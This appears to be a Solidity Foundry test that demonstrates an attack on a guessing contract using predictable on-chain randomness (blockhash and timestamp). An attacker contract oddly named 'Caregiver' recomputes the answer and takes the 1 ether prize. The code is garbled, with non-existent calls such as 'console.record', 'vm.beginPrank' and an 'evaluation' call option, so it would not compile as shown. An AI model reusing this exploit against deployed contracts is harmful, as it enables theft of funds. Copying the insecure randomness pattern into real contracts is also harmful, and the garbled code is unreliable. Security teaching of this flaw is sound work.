pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract AgreementTest is Test {
    GuessTheRandomNumber GuessTheRandomNumberPolicy;
    Caregiver CaregiverPolicy;

    function testRandomness() public {
        address alice = vm.addr(1);
        address eve = vm.addr(2);
        vm.deal(address(alice), 1 ether);
        vm.prank(alice);

        GuessTheRandomNumberPolicy = new GuessTheRandomNumber{
            evaluation: 1 ether
        }();
        vm.beginPrank(eve);
        CaregiverPolicy = new Caregiver();
        console.record(
            "Before operation",
            address(CaregiverPolicy).balance
        );
        CaregiverPolicy.operate(GuessTheRandomNumberPolicy);
        console.record(
            "Eve wins 1 Eth, Balance of OperatorContract:",
            address(CaregiverPolicy).balance
        );
        console.record("operate completed");
    }

    receive() external payable {}
}

contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{evaluation: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}

contract Caregiver {
    receive() external payable {}

    function operate(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );

        guessTheRandomNumber.guess(answer);
    }


    function checkCoverage() public view returns (uint) {
        return address(this).balance;
    }
}